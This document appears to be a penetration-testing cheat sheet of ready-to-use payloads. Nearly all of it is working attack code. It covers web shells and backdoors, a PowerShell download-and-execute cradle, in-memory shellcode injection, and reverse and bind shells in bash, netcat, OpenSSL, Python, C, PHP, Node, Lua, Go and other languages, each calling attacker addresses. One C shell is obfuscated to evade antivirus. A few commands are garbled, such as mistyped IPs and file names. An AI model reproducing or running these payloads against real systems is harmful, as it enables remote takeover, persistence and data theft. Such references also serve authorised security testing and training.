# ⭕ Other Payloads

## <mark style="color:red;">Web Shells</mark>

The following shells exist within Kali Linux, under /usr/share/webshells/ these are only useful if you are able to upload, inject or transfer the shell to the machine.

### <mark style="color:orange;">weevely payloads</mark>

generate:

```
weevely generate [password] [file name].php
```

connect:

```
weevely http://192.168.56.102/dvwa/hackable/uploads/shell.php [password]
```

​run a reverse tcp backdoor from weevely shell:

```
backdoor_reversetcp -vector netcat 192.168.56.1 6969
```

dump sql database with weevely:

```
sql_dump -vector mysqldump_sh -host localhost -lpath /root/dvwa-data.txt db name] [user] [passwd]
```

### <mark style="color:orange;">Kali PHP Web Shells</mark>

Kali PHP reverse shells and command shells:

| Command                                                                               | Description                                                                                                                                                           |
| ------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /usr/share/webshells/php/ php-reverse-shell.php                                       | Pen Test Monkey - PHP Reverse Shell                                                                                                                                   |
| /usr/share/webshells/ php/php-findsock-shell.php /usr/share/webshells/ php/findsock.c | Pen Test Monkey, Findsock Shell. Build gcc -o findsock findsock.c (be mindfull of the target servers architecture), execute with netcat not a browser nc -v target 80 |
| /usr/share/webshells/ php/simple-backdoor.php                                         | PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: http://target.com/simple- backdoor.php?cmd=cat+/etc/passwd                     |
| /usr/share/webshells/ php/php-backdoor.php                                            | Larger PHP shell, with a text input box for command execution.                                                                                                        |

{% hint style="info" %}
The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.
{% endhint %}

### <mark style="color:orange;">Kali Perl Reverse Shell</mark>

Kali perl reverse shell:\\

| Command                                          | Description                                                                       |
| ------------------------------------------------ | --------------------------------------------------------------------------------- |
| /usr/share/webshells/perl/ perl-reverse-shell.pl | Pen Test Monkey - Perl Reverse Shell                                              |
| /usr/share/webshells/ perl/perlcmd.cgi           | Pen Test Monkey, Perl Shell. Usage: http://target.com/perlcmd.cgi?cat /etc/passwd |

### <mark style="color:orange;">Kali Cold Fusion Shell</mark>

Kali Coldfusion Shell:

| Command                             | Description                       |
| ----------------------------------- | --------------------------------- |
| /usr/share/webshells/cfm/cfexec.cfm | Cold Fusion Shell - aka CFM Shell |

### <mark style="color:orange;">Kali ASP Shell</mark>

Classic ASP Reverse Shell + CMD shells:

| Command                   | Description     |
| ------------------------- | --------------- |
| /usr/share/webshells/asp/ | Kali ASP Shells |

### <mark style="color:orange;">Kali ASPX Shells</mark>

ASP.NET reverse shells within Kali

| Command                    | Description      |
| -------------------------- | ---------------- |
| /usr/share/webshells/aspx/ | Kali ASPX Shells |

### <mark style="color:orange;">Kali JSP Reverse Shell</mark>

Kali JSP Reverse Shell:

<table><thead><tr><th width="228">Command</th><th>Description</th></tr></thead><tbody><tr><td>/usr/share/webshells/jsp/jsp-reverse.jsp</td><td>Kali JSP Reverse Shell</td></tr></tbody></table>

## <mark style="color:red;">Powershell</mark>

### <mark style="color:orange;">load script in memory</mark>

```
IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1/foo.ps1') ;
```

### <mark style="color:orange;">Proxy-aware Load in Memory with User Agent</mark>

```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start =
$key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "RELPACE THIS")
IEX()$wc.DownloadString("http://192.168.56.1/run.ps1")
```

#### one-liner

```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$keys = Get-ChildItem 'HKU:\';ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}};$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr");$wc = new-object system.net.WebClient;$wc.Headers.Add('User-Agent', "RELPACE THIS");IEX($wc.DownloadString("http://192.168.56.1/run.ps1"))
```

### <mark style="color:orange;">PowerShell Reverse Shells</mark>

setup a netcat listener:

```
nc -nvlp 4444
```

this code is a reverse shell in powershell:

```
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
```

one-liner:

```
powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',6969);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### <mark style="color:orange;">PowerShell Bind Shells</mark>

```
powershell  -ep bypass -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',6666);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

{% hint style="info" %}
ip should be the windows machine IP which is hosting the listener
{% endhint %}

now we connect to the listener with nc:

```
nc [ip] [port] 
```

### <mark style="color:orange;">in-memory injection</mark>

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat
ionType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc =
Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]]$sc = <place your shellcode here>;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc
[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
```

## <mark style="color:red;">Bash</mark>&#x20;

### <mark style="color:orange;">Bash Reverse</mark>

```
# attacker:
nc -l -p 8080 -vvv

# victim:
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
exec 5<>/dev/tcp/[ip]/8080
cat <&5 | while read line; do $line 2>&5 >&5; done
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```

### <mark style="color:orange;">Bash UDP</mark>

```
Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```

### <mark style="color:orange;">mknod Reverse Shell</mark>

```
nc -nvlp 6666 → attacker

mknod /tmp/backpipe p; /bin/sh 0< /tmp/backpipe | nc 192.168.56.1 6666 1> /tmp/backpipe → victim
```

## <mark style="color:red;">Netcat</mark>

```
msfvenom -p cmd/unix/reverse_netcat lhost=0.0.0.0 lport=9999 R → auto generate, can be perl or python instead of netcat

mkfifo /tmp/lnyzdr; nc 0.0.0.0 9999 0</tmp/lnyzdr | /bin/sh >/tmp/lnyzdr 2>&1; rm /tmp/lnyzdr  → host

rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

### <mark style="color:orange;">without -e option</mark>

for freeBSD version of netcat without -e (command execution) option:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc 192.168.5.1 5555 >/tmp/f
```

## <mark style="color:red;">Busy Box</mark>

```
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

## <mark style="color:red;">Ncat</mark>

```
ncat --udp -lvp 4242
ncat --sctp -lvp 4242
ncat --tcp -lvp 4242
```

## <mark style="color:red;">OpenSSL</mark>

Attacker:

```
user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
or
user@attack$ ncat --ssl -vv -l -p 4242

user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
```

TLS-PSK (does not rely on PKI or self-signed certificates)

```
# generate 384-bit PSK
# use the generated string as a value for the two PSK variables from below
openssl rand -hex 48 
# server (attacker)
export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
# client (victim)
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

## <mark style="color:red;">Groovy</mark>

```
String host="10.0.0.1";
int port=1234;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## <mark style="color:red;">AWK</mark>

```
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## <mark style="color:red;">WAR</mark>

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
```

## <mark style="color:red;">GHAWK</mark>

```
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## <mark style="color:red;">Powercat</mark>

### <mark style="color:orange;">Powercat Bind Shells</mark>

```
powercat -l -p 443 -e cmd.exe
nc 10.11.0.22 443
```

### <mark style="color:orange;">Powercat Stand-Alone Payloads</mark>

In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user

first we launch a netcat listener in attacker machine:

```
nc -nvlp 4444
```

​​we create a stand-alone reverse shell payload by adding the -g option to the previous powercat command and redirecting the output to a file. This will produce a powershell script that attacker can execute on his machine

```
powercat -c 10.11.0.4 -p 4444 -e cmd.exe -g > reverseshell.ps1
./reverseshell.ps1
```

To generate a stand-alone encoded payload, we use the -ge option and once again redirect the output to a file:

```
powercat -c 10.11.0.4 -p 4444 -e cmd.exe -ge > encrypted-reverseshell.ps1
```

The file will contain an encoded string that can be executed using the PowerShell -E (EncodedCommand) option. However, since the -E option was designed as a way to submit complex commands on the command line, the resulting encodedreverseshell.ps1 script can not be executed in the same way as our unencoded payload. Instead, Bob needs to pass the whole encoded string to powershell.exe -E so we copy the whole file and paste it in the console:

```
powershell.exe -E [code]
```

## <mark style="color:red;">Python</mark>

### <mark style="color:orange;">for Linux</mark>

```
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
```

#### <mark style="color:green;">IPv6</mark>

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### <mark style="color:green;">Script</mark>

```
#!/usr/bin/env python
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",666))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### <mark style="color:orange;">for Windows</mark>

```
exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.1",666)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
```

or

```
python -c 'exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.1",666)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
```

#### <mark style="color:green;">Script</mark>

```
import os, socket, subprocess, threading, sys

def s2p(s, p):
    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()

def p2s(s, p):
    while True: s.send(p.stdout.read(1).encode())

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try: s.connect((10.0.0.1, 666)); break
    except: pass

p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)

threading.Thread(target=s2p, args=[s,p], daemon=True).start()

threading.Thread(target=p2s, args=[s,p], daemon=True).start()

try: p.wait()
except: s.close(); sys.exit(0)

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

## <mark style="color:red;">C language</mark>

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
    int sockfd;         
    int lportno = 12345;    
    struct sockaddr_in serv_addr;
    char *const params[] = {"/bin/sh",NULL};
    char *const environ[] = {NULL};

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("192.168.57.102");
    serv_addr.sin_port = htons(lportno);  
    connect(sockfd, (struct sockaddr *) &serv_addr, 16);

    dup2(sockfd,0);
    dup2(0,1);
    dup2(0,2);
    execve("/bin/sh",params,environ);
}
```

```
/* Windows Reverse Shell 
Test under windows 7 with AVG Free Edition.
Author: Ma~Far$ (a.k.a. Yahav N. Hoffmann)
Writen 2016 - Modified 2016
This program is open source you can copy and modify, but please keep author credit!
Made a bit more stealthy by infoskirmish.com - 2017
*/

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "w2_32")

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;
  

int main(int argc, char *argv[]) 
{
	WSAStartup(MAKEWORD(2,2), &wsaData);
	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
    
    	if (argv[1] == NULL){
		exit(1);
	}

    	struct hostent *host;
	host = gethostbyname(argv[1]);
	strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    
	hax.sin_family = AF_INET;
	hax.sin_port = htons(atoi(argv[2]));
	hax.sin_addr.s_addr =inet_addr(aip_addr);
    
	WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);
	if (WSAGetLastError() == 0) {

		memset(&ini_processo, 0, sizeof(ini_processo));

		ini_processo.cb=sizeof(ini_processo);
		ini_processo.dwFlags=STARTF_USESTDHANDLES;
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

		char *myArray[4] = { "cm", "d.e", "x", "e" };
		char command[8] = "";
		snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);

		CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
		exit(0);
	} else {
		exit(0);
	}    
}
```

## <mark style="color:red;">DLL injection</mark>

```
apt install mingw32-gcc-c++.x86_64
apt install mingw32-winpthreads*

i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
i686-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
```

```
#include <windows.h>
int fireLazor()
{
 WinExec("calc", 0);
 return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 fireLazor();
 return 0;
}
```

## <mark style="color:red;">Xterm</mark>

```
xterm -display 10.0.0.1:1 → host

Xnest :1 → attacker allow connection

xhost +targetip → attacker
```

## <mark style="color:red;">Telnet</mark>

```
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

## <mark style="color:red;">Socat</mark>

### <mark style="color:orange;">connect</mark>

```
socat - TCP4:[ip]:[port] 
socat TCP4-LISTEN:[port] STDOUT
```

### <mark style="color:orange;">file transfer</mark>

```
sudo socat TCP4-LISTEN:443,fork file:file.txt
socat TCP4:18.11.8.4:443 file:file.txt,create
```

### <mark style="color:orange;">reverse shell</mark>

```
socat -d -d TCP4-LISTEN:443 STDOUT
socat TCP4:18.11.8.22:443 EXEC:/bin/bash
```

### <mark style="color:orange;">Encrypted Bind Shells</mark>

​​create a cert with openssl:

```
openssl req -newkey rsa:2848 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
```

```
req: initiate a new certificate signing request
-newkey: generate a new private key
rsa:2848: use RSA encryption with a 2,048-bit key length.
-nodes: store the private key without passphrase protection
-keyout: save the key to a file
-xse9: output a self-signed certificate instead of a certificate request
-days: set validity period in days
-out: save the certificate to a file
```

​merge two files to create a usable pem file for socat:

```
cat bind_shett.key bind_shett.crt > bind_shett.pem

socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=e,fork EXEC:/bin
/bash

socat - OPENSSL:1e.11. e .4:443,verify=8
```

### <mark style="color:orange;">intractive shell</mark>

```
socat file:`tty`,raw,echo=0 tcp-listen:4444 → attacker
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  → host
```

## <mark style="color:red;">Ruby</mark>

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'  
```

## <mark style="color:red;">Dart</mark>

```
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("10.0.0.1", 4242).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```

## <mark style="color:red;">NodeJS</mark>

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py

```

## <mark style="color:red;">LUA</mark>

Linux only

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

Windows and Linux

```
lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## <mark style="color:red;">Golang</mark>

```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## <mark style="color:red;">PHP</mark>

### <mark style="color:orange;">php reverse shell</mark>

{% embed url="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" %}

### <mark style="color:orange;">PHP in web pages</mark>

#### <mark style="color:green;">linux</mark>

```
<?php echo shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/666 0>&1'")?>
```

#### <mark style="color:green;">windows</mark>

```
<?php echo shell_exec("powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -Name System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"")?>
```

### <mark style="color:orange;">PHP one-liner</mark>

This code assumes that the TCP connection uses file descriptor 3.f it doesn’t work, try 4, 5, 6…

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

Try this first

```
message=test;phpinfo(); 
message=test;system(‘ls -la’); 

<?php echo exec($_REQUEST['c']);?>
```

​​Try this next if the first doesn't work

```
<?php echo exec($_GET['c']); ?>

<?php -r '$sock=fsockopen(10.11.0.220",1234);exec("/bin/sh -i <&d >&%d 2>&%d",f,f,f)' ?>
```

#### <mark style="color:green;">Simple PHP Backdoor By DK (One-Liner Version)</mark>

Usage:

```
http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd 

 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>


php -r '$sock=fsockopen(10.11.0.220",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### <mark style="color:orange;">msfvenom</mark>

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
```

### <mark style="color:orange;">shell.php</mark>

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.56.1';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
// Fork and have the parent process exit
$pid = pcntl_fork();

if ($pid == -1) {
printit("ERROR: Can't fork");
exit(1);
}

if ($pid) {
exit(0);  // Parent exits
}

// Make the current process a session leader
// Will only succeed if we forked
if (posix_setsid() == -1) {
printit("Error: Can't setsid()");
exit(1);
}

$daemon = 1;
} else {
printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
printit("$errstr ($errno)");
exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
printit("ERROR: Can't spawn shell");
exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
// Check for end of TCP connection
if (feof($sock)) {
printit("ERROR: Shell connection terminated");
break;
}

// Check for end of STDOUT
if (feof($pipes[1])) {
printit("ERROR: Shell process terminated");
break;
}

// Wait until a command is end down $sock, or some
// command output is available on STDOUT or STDERR
$read_a = array($sock, $pipes[1], $pipes[2]);
$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

// If we can read from the TCP socket, send
// data to process's STDIN
if (in_array($sock, $read_a)) {
if ($debug) printit("SOCK READ");
$input = fread($sock, $chunk_size);
if ($debug) printit("SOCK: $input");
fwrite($pipes[0], $input);
}

// If we can read from the process's STDOUT
// send data down tcp connection
if (in_array($pipes[1], $read_a)) {
if ($debug) printit("STDOUT READ");
$input = fread($pipes[1], $chunk_size);
if ($debug) printit("STDOUT: $input");
fwrite($sock, $input);
}

// If we can read from the process's STDERR
// send data down tcp connection
if (in_array($pipes[2], $read_a)) {
if ($debug) printit("STDERR READ");
$input = fread($pipes[2], $chunk_size);
if ($debug) printit("STDERR: $input");
fwrite($sock, $input);
}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
if (!$daemon) {
print "$string\n";
}
}

?>
```

